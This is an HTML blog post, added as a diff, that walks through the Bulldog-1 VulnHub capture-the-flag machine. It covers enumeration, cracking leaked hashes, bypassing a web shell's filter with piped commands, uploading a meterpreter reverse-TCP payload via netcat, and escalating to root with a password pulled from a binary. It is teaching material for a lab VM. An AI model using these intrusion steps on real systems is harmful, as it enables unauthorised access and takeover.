@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Clean Blog - Start Bootstrap Theme</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="css/clean-blog.min.css" rel="stylesheet">
+
+  </head>
+
+  <body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+      <div class="container">
+        <a class="navbar-brand" href="index.html">Zestall</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+          Menu
+          <i class="fa fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+              <a class="nav-link" href="index.html">Home</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="about.html">About</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="post.html">Sample Post</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="contact.html">Contact</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Page Header -->
+    <header class="masthead" style="background-image: url('img/post-bg.jpg')">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-md-10 mx-auto">
+            <div class="post-heading">
+              <h1>Bulldog-1 CTF</h1>
+              <h2 class="subheading">Solving your first Boot to Root</h2>
+              <span class="meta">Posted by
+                <a href="contact.html">CJ</a>
+                on November 3, 2017</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-md-10 mx-auto">
+            <p>For everyone out there who share the same enthusiasm as I do.
+              This is my first blog post, ever. I am doing this so that we, as the beginners in this field, can help each other out.
+              With that being said, let’s dive right into it.</p>
+
+            <p class="alert alert-danger">
+            <strong>
+              Please try exploiting this vulnerable machine yourself, before reading anything below.
+              If you are really stuck, have a glimpse at the subheading and try using that method or Google about it to learn more.
+            </strong>
+            </p>
+
+            <p class="alert alert-info">
+              Link to download bulldog vulnerable machine:
+              <a class="text-success" href="https://www.vulnhub.com/entry/bulldog-1,211/">
+                https://www.vulnhub.com/entry/bulldog-1,211/
+              </a>
+            </p>
+
+            <p>
+              Once, you got your machine up and running in VirtualBox, your assigned IP address would appear. With that, we can start enumeration.
+            </p>
+
+            <a href="img/bulldog/oracle_vm_bulldog.png">
+              <img class="img-fluid" src="img/bulldog/oracle_vm_bulldog.png" alt="">
+            </a>
+
+            <h2 class="section-heading">Enumeration</h2>
+
+            <p>
+              Gather as much info as possible with the tools at your disposal.
+              There are tons of such tools to use. We will start with the most important and fundamental one, nmap.
+              If we type the following in the terminal of our kali system, we get
+            </p>
+
+            <p>
+              <code>
+                nmap 192.168.0.108 		//IP address of victim machine
+              </code>
+            </p>
+
+            <!--
+            <blockquote class="blockquote">The dreams of yesterday are the hopes of today and the reality of tomorrow. Science has not yet mastered prophecy. We predict too much for the next year and yet far too little for the next ten.</blockquote>
+            -->
+
+            <a href="img/bulldog/nmap.png">
+              <img class="img-fluid" src="img/bulldog/nmap.png" alt="">
+            </a>
+
+            <p>
+              We can see that the command returns the services which are running on the machine.
+              Since it is running an HTTP server, on port 80, let’s open up our browser and have a look at it.
+            </p>
+
+            <a href="img/bulldog/homescreen.png">
+              <img class="img-fluid" src="img/bulldog/homescreen.png" alt="">
+            </a>
+
+            <p>
+            </p>
+
+            <a href="img/bulldog/notice.png">
+              <img class="img-fluid" src="img/bulldog/notice.png" alt="">
+            </a>
+
+            <p>
+              The background story is a good read, but apart from that inspecting the pages doesn’t give us much.
+            </p>
+
+            <p>
+              Let’s use your next tool in our arsenal, nikto. It is an open source web application scanner,
+              which scans the server for multiple items including improper configuration of servers and as in our
+              case provides names of directories or files which are open to the world.
+            </p>
+
+            <p>
+              <code>
+                nikto –h 192.168.0.108	//IP address of victim machine
+              </code>
+            </p>
+
+            <a href="img/bulldog/nikto.png">
+              <img class="img-fluid" src="img/bulldog/nikto.png" alt="">
+            </a>
+
+            <p>
+              Going to dev, we get
+            </p>
+
+            <a href="img/bulldog/dev_html.png">
+              <img class="img-fluid" src="img/bulldog/dev_html.png" alt="">
+            </a>
+
+            <p>
+              Reading these messages, we can see that this is their new developing website, with server django, and the web
+              shell is the way they decide to go about securing their new website. Clicking on the link, we are asked to authenticate with the server.
+            </p>
+
+            <p>
+              Then I searched for some know vulnerabilities in django that might allow us access but couldn’t find one that might be appropriate in this scenario.
+            </p>
+
+            <p>
+              When I started inspecting these pages using inspect element tool, in the browser, something caught my attention.
+            </p>
+
+            <a href="img/bulldog/hashes.png">
+              <img class="img-fluid" src="img/bulldog/hashes.png" alt="">
+            </a>
+
+            <p>
+              The developers left their hashes in comments of the HTML page, thinking no one would look, and most likely it can’t be cracked.
+              While this may be true, it’s highly possible that they have already been cracked in some database available online.
+              (Especially since it an intentionally vulnerable VM). All we have to do next is to try out every one of them.
+            </p>
+
+            <ul class="list-group">
+              <li class="list-group-item list-group-item-success">
+              alan:
+              6515229daf8dbdc8b89fed2e60f107433da5f2cb</li>
+              <li class="list-group-item list-group-item-success">
+              william:
+              38882f3b81f8f2bc47d9f3119155b05f954892fb</li>
+              <li class="list-group-item list-group-item-success">
+              malik:
+              c6f7e34d5d08ba4a40dd5627508ccb55b425e279</li>
+              <li class="list-group-item list-group-item-success">
+              kevin:
+              0e6ae9fe8af1cd4192865ac97ebf6bda414218a9</li>
+              <li class="list-group-item list-group-item-success">
+              ashley:
+              553d917a396414ab99785694afd51df3a8a8a3e0</li>
+              <li class="list-group-item list-group-item-success">
+              nick:
+              ddf45997a7e18a25ad5f5cf222da64814dd060d5</li>
+              <li class="list-group-item list-group-item-success">
+              sarah:
+              d8b8dd5e7f000b8dea26ef8428caf38c04466b3e</li>
+            </ul>
+
+            <p>
+              After a few google searches later, I landed on crackstation.net, where I was able break the last two hashes.
+            </p>
+
+            <a href="img/bulldog/cracked_hash.png">
+              <img class="img-fluid" src="img/bulldog/cracked_hash.png" alt="">
+            </a>
+
+            <p>
+              Now, we can use this to login as “sarah” using
+              password ‘bulldoglover” in django admin page locates at IPADDRESSOFVM/admin (This portal is the default one for django).
+            </p>
+
+            <a href="img/bulldog/django_admin.png">
+              <img class="img-fluid" src="img/bulldog/django_admin.png" alt="">
+            </a>
+
+            <p>
+              Sorry, I mistyped the password here. Once I gave the right one, we gained access to the portal.
+            </p>
+
+            <a href="img/bulldog/django_admin_loggedin.png">
+              <img class="img-fluid" src="img/bulldog/django_admin_loggedin.png" alt="">
+            </a>
+
+            <p>
+              Now, there is nothing much we can do here. I had a look around and found nothing that could be done since we are not an admin.
+              But if you remember, we have our web shell we could go to. Going back to /dev/shell, we get the following page.
+            </p>
+
+            <h2 class="section-heading">GETTING SHELL ACCESS</h2>
+
+            <p>
+              I tried a few commands given there which seems to work and directly run on the server as mentioned.
+              When I try a command which is not listed here, it returns the message
+              <blockquote class="blockquote">INVALID COMMAND. I CAUGHT YOU HACKER</blockquote>
+            </p>
+
+            <p>
+              Since we don’t listen to warning signs, we can try using “;” to run multiple commands but it seems to figure it out too.
+              Next, we try piping commands together to see if they work. Upon running the following command, we can see that the server returns the following output.
+            </p>
+
+            <p>
+              <code>
+                ls | date
+              </code>
+            </p>
+
+            <a href="img/bulldog/ls_pipe_date.png">
+              <img class="img-fluid" src="img/bulldog/ls_pipe_date.png" alt="">
+            </a>
+
+            <p>
+              We seem to have run a command which is not specified.
+              Now we can start playing with the system and probing it for various responses by giving it various commands to run.
+            </p>
+
+            <p>
+              Alternatively, we could have gone to do some more enumeration, and found out the file running this program, as given below.
+              Upon analysing it, we can see that any command with ”;” symbol is filtered out and tried piping and other approaches.
+            </p>
+
+            <a href="img/bulldog/proof_web_shell_command.png">
+              <img class="img-fluid" src="img/bulldog/proof_web_shell_command.png" alt="">
+            </a>
+
+            <p>
+              After various attempts to add a new user, or change the password of existing user and trying to connect
+              directly to the server failed (mostly because of firewall), I tried to upload a python revers shell script
+              to the server to make it connect back to us.
+            </p>
+
+            <p>
+              Now, we could write the script ourselves, but for the time being let’s use the one which is already available and well tested.
+              Here I am using msfvenom to create a python/meterpreter/reverse_tcp payload. Msfvenom,as described in the offensive-security
+              official website, is a Metasploit standalone payload generator. Using the following command generates our required payload.
+            </p>
+
+            <p>
+              <h4>
+                On attacker machine:
+              </h4>
+              <code>
+                msfconsole –p python/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=2345 > reverse.py
+              </code>
+            </p>
+
+            <p>
+              This generates a payload and writes it to reverse.py file in the same directory. LHOST specifies the IP
+              address of the attacker machine and LPORT specifies the port it should connect back to, once the script is run on the victim machine.
+            </p>
+
+            <a href="img/bulldog/msfvenom.png">
+              <img class="img-fluid" src="img/bulldog/msfvenom.png" alt="">
+            </a>
+
+            <p>
+              We can send the file to the server using nc command (netcat). All we need to do is to make the server listen to some port on its local machine and write
+              the output content to a file, say the reverse.py (this file name doesn’t have to be the same as the one created). This is done using the following command.
+            </p>
+
+            <h3>On web shell:</h3>
+
+            <p>
+              <code>
+                ls | nc –l –p 6666 > reverse.py
+              </code>
+            </p>
+
+            <p>
+              This command specifies to make nc listen on port 6666 and send the data received to reverse.py file.
+            </p>
+
+            <a href="img/bulldog/shell_file_upload_listener.png">
+              <img class="img-fluid" src="img/bulldog/shell_file_upload_listener.png" alt="">
+            </a>
+
+            <h3>On attacking machine:</h3>
+
+            <p>
+              <code>
+                nc 192.168.0.108 6666 < reverse.py
+              </code>
+            </p>
+
+            <p>
+              This command specifies that we need to connect to this host (IP address of victim machine) to port 6666 and send
+              the data contained in reverse.py to it.
+            </p>
+
+            <a href="img/bulldog/shell_file_upload_sender.png">
+              <img class="img-fluid" src="img/bulldog/shell_file_upload_sender.png" alt="">
+            </a>
+
+            <p>
+              Now, before we run the script on the victim machine, we need to start Metasploit on the attacker system. This is done using the following command.
+            </p>
+
+            <h3>On attackers system:</h3>
+            <p>
+              <code>
+                msfconsole
+              </code>
+            </p>
+
+            <p>
+              This will open up Metasploit. Once, it prompts msf, we can write a series of command to start a reverse TCP handler.
+            </p>
+
+            <ul class="list-group">
+              <li class="list-group-item list-group-item-success">
+              1)	use multi/handler
+              </li>
+              <li class="list-group-item list-group-item-success">
+              2)	set payload python/meterpreter/reverse_tcp</li>
+              <li class="list-group-item list-group-item-success">
+              3)	set LHOST 192.168.0.109</li>
+              <li class="list-group-item list-group-item-success">
+              4)	set LPORT 2345</li>
+              <li class="list-group-item list-group-item-success">
+              5)	exploit</li>
+            </ul>
+
+            <p>
+              The first command specifies meterpreter to create a handler to handle multiple incoming sessions
+              and run in the background (even though we need only one session for this exploit). The second command specifies
+              the payload which will cause a connection back, in our case python/meterpreter/reverse_tcp.
+            </p>
+
+            <p>
+              Now, we have to set a few options which are mandatory to run this command. These options which need to be
+              set can be seen using “show options” command. We can see that LHOST and LPORT are needed, so we write the
+              command specified in 3 and 4, where LHOST is attackers IP address and the port the
+              payload we created specifies. Finally, exploit to run the handler.
+            </p>
+
+            <a href="img/bulldog/msfconsole_reverse_tcp.png">
+              <img class="img-fluid" src="img/bulldog/msfconsole_reverse_tcp.png" alt="">
+            </a>
+
+            <p>
+              Now, if we run the reverse.py script in victim machine, we get a connection back to our attacking machine.
+              This is done by running the following commands.
+            </p>
+
+            <h3>On victim machine:</h3>
+
+            <p>
+              <code>
+                ls | chmod +x reverse.py
+              </code>
+            </p>
+
+            <p>
+              This command makes the file executable by every user in the system (Since we are the owner of the file, we can change its permissions). Now,
+            </p>
+
+            <p>
+              <code>
+                ls | python reverse.py
+              </code>
+            </p>
+
+            <p>
+              This command runs the python script, while causes a connection to be established with our attacking machine.
+            </p>
+
+            <a href="img/bulldog/reverse_shell_before_in_webshell.png">
+              <img class="img-fluid" src="img/bulldog/reverse_shell_before_in_webshell.png" alt="">
+            </a>
+
+            <p>
+              When a connection is established, meterpreter starts a session which is in the background. We can interact
+              with the session created using, the following command on our attacking machine.
+            </p>
+
+            <h3>On attacking machine:</h3>
+
+            <p>
+              <code>
+                sessions –i 1
+              </code>
+            </p>
+
+            <p>
+              This starts an interaction with the session obtained. Now, we can see all the commands available by typing help command in it.
+              Since we are exploiting the system to get shell access, we give shell command.
+            </p>
+
+            <p>
+              <code>
+                shell
+              </code>
+            </p>
+
+            <p>
+              This will open up a shell prompt and give it to us to use.
+            </p>
+
+            <h2 class="subheading">GETTING ADMIN ACCESS: (usually the hard part, but not so here)</h2>
+
+            <p>
+              We can type the following commands to get started.
+            </p>
+
+            <p>
+              <code>
+                whoami <br/> id
+              </code>
+            </p>
+
+            <p>
+              This first command prints the current user and second gives us the user and group id. These prints django here with its associated ids.
+              To make the shell prompt somewhat better (than this crappy one), we can type
+            </p>
+
+            <p>
+              <code>
+                python –c ‘import pty;pty.spawn(“/bin/bash”)’
+              </code>
+            </p>
+
+            <p>
+              Now, we can enumerate even more by looking at all directories and files, which we have access to, change or make or break whatever is available to us.
+               After spending some time getting to know about the system and the processes running, I explored the bulldogadmin home directory.
+               It seemed empty at first, and hence I used,
+            </p>
+
+            <p>
+              <code>
+                ls –la
+              </code>
+            </p>
+
+            <p>
+              This command lists all the files including hidden ones and lists all the permissions, owner, group, and time last modified details.
+            </p>
+
+            <p>
+              This command produced this, with the eye-catcher being hiddenadmindirectory.
+            </p>
+
+            <a href="img/bulldog/hidden_directory.png">
+              <img class="img-fluid" src="img/bulldog/hidden_directory.png" alt="">
+            </a>
+
+            <p>
+              When I entered into the directory, I came across a note file, so I obviously printed it out to see what message it holds.
+            </p>
+
+            <a href="img/bulldog/note_in_hidden_directory.png">
+              <img class="img-fluid" src="img/bulldog/note_in_hidden_directory.png" alt="">
+            </a>
+
+            <p>
+              In essence, it says something about customPermissionApp which decides which user should have access to file depending on the username and password provided.
+              <br/>I then checked the file format of customPermissionApp using the following command,
+            </p>
+
+            <p>
+              <code>
+                file customPermissionApp
+              </code>
+            </p>
+
+            <p>
+              It returned an ELF 64-bit executable, but upon further checking the permission of the file, it was not executable by django user.
+            </br>The next step that is usually and should be taken is using the strings command.
+            </p>
+
+            <p>
+              <code>
+                strings customPermissionApp
+              </code>
+            </p>
+
+            <p>
+              What this command does is, it returns each string of printable characters in files. Its main uses are to determine
+              the contents of and to extract text from binary files (i.e., non-text files). For us, it means if the password is
+              being compared with some plain text in the program, we can see it, and that is exactly what happens when we run it.
+            </p>
+
+            <a href="img/bulldog/strings_in_executable.png">
+              <img class="img-fluid" src="img/bulldog/strings_in_executable.png" alt="">
+            </a>
+
+            <p>
+              If you notice, the last but three and three lines preceding it contains something which could be a password
+              (since it says superultimatepasswordyoucantget). If we copy these four lines to a text editor and
+              remove the last character ‘H’ and join the lines we get
+            </p>
+
+            <p>
+              <code>
+                SUPERultimatePASSWORDyouCANTget
+              </code>
+            </p>
+
+            <p>
+              And since the note specifies that django has sudo access, let’s try to switch user to root using </br>
+            </p>
+
+            <p>
+              <code>
+                  sudo su<br/>
+                </code>
+            </p>
+
+            <p>
+              sudo is used to run the following command with the privileges of superuser, and su command switches users.
+              Since no username is followed, it defaults to root user switch. Now, when prompted for a password for django, let’s try the above-obtained password.
+            </p>
+
+            <a href="img/bulldog/root_access.png">
+              <img class="img-fluid" src="img/bulldog/root_access.png" alt="">
+            </a>
+
+            <p>
+              And voila, we have root access. We can double check this by using whoami and id commands.
+              <br/>Finally, we can go into /root directory and list the files and directory present using ls command.
+              We can see that there is a congrats.txt file with the following content.
+            </p>
+
+            <a href="img/bulldog/success.png">
+              <img class="img-fluid" src="img/bulldog/success.png" alt="">
+            </a>
+
+            <p>
+              Thank you for reading this post. If you have any question, queries, or correction please feel free to contact me.
+            </p>
+
+            <p class="alert alert-success">
+              Special thanks to Nick Frichette for creating this vulnerable machine and to vulnhub.com for letting everyone learn for free.
+            </p>
+
+          </div>
+        </div>
+      </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-md-10 mx-auto">
+            <ul class="list-inline text-center">
+              <li class="list-inline-item">
+                <a href="https://twitter.com/mangekyou_ch">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li class="list-inline-item">
+                <a href="https://www.facebook.com/KoushikJanakiraman">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li class="list-inline-item">
+                <a href="#">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+            </ul>
+            <p class="copyright text-muted">Copyright &copy; Zestall.com 2017</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Bootstrap core JavaScript -->
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="vendor/popper/popper.min.js"></script>
+    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Custom scripts for this template -->
+    <script src="js/clean-blog.min.js"></script>
+
+  </body>
+
+</html>
